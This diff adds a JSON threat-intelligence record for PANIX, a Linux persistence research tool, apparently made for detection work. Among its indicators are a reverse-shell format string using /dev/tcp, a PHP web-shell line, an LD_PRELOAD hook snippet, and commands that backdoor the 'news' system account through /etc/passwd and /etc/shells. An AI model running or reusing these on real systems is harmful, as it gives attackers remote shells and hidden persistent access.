@@ -1,0 +1,280 @@
+{
+  "malware_family": "PANIX",
+  "threat_actor": "",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "PANIX is a research tool demonstrating Linux persistence techniques. It can establish persistence via LD_PRELOAD hijacking, loadable kernel modules (LKM), web shells (PHP/Python), and by backdooring system user accounts for SSH access.",
+  "mitre_techniques": [
+    "T1574.006",
+    "T1547.006",
+    "T1014",
+    "T1505.003",
+    "T1098.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "/etc/ld.so.preload",
+      "context": "PANIX appends the path to its malicious shared object to this file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/lib/preload_backdoor.so",
+      "context": "The malicious shared object created and used by the LD_PRELOAD module.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/preload/preload_backdoor.c",
+      "context": "The temporary C source code file for the LD_PRELOAD backdoor.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "bash -i >& /dev/tcp/%s/%d 0>&1",
+      "context": "Format string for reverse shell command inside the LD_PRELOAD hook.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "original_execve = dlsym(RTLD_NEXT, \"execve\");",
+      "context": "Code snippet from LD_PRELOAD hook to find original execve function.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[+] Backdoor added to /etc/ld.so.preload for persistence.",
+      "context": "PANIX output message confirming LD_PRELOAD persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MODULE_AUTHOR(\"PANIX\")",
+      "context": "Author metadata embedded in the LKM backdoor.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MODULE_DESCRIPTION(\"LKM Backdoor\")",
+      "context": "Description metadata embedded in the LKM backdoor.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "lkm_backdoor_thread",
+      "context": "The name given to the kernel thread created by the LKM.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "panix.ko",
+      "context": "The malicious Loadable Kernel Module file name.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/lkm/panix.c",
+      "context": "The temporary C source code for the LKM backdoor.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/modules-load.d/panix.conf",
+      "context": "Configuration file created for LKM persistence across reboots.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "python3 -m http.server --cgi",
+      "context": "Command to start a Python 3 web server with CGI support.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "cmd.php",
+      "context": "File name for the PHP command execution web shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "reverse.py",
+      "context": "File name for the Python CGI reverse shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/home/ruben/panix/",
+      "context": "Directory created to host web shells when run as a non-root user.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "shell_exec($_GET['cmd'])",
+      "context": "Core command execution logic in the example PHP web shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/usr/sbin/nologin ",
+      "context": "A copy of a shell masquerading as nologin with a trailing space.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cp /bin/dash \"/usr/sbin/nologin \"",
+      "context": "Command used to create a backdoored shell masquerading as nologin.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sed -i \"/^news:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |\" /etc/passwd",
+      "context": "Command to modify the 'news' user's shell to the backdoored one.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "echo \"nologin \" >> /etc/shells",
+      "context": "Command to add the backdoored shell to the list of valid shells.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "nologin ",
+      "context": "The string (with a trailing space) added to /etc/shells.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/spool/news/.ssh/authorized_keys",
+      "context": "Path for SSH key persistence using the 'news' system user account.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[+] System user backdoor persistence established for user: news",
+      "context": "PANIX output message confirming the system user backdoor.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/cmd.php",
+      "context": "URI path for the PHP command execution web shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/cgi-bin/reverse.py",
+      "context": "URI path for the Python CGI reverse shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "elf",
+    "script"
+  ]
+}
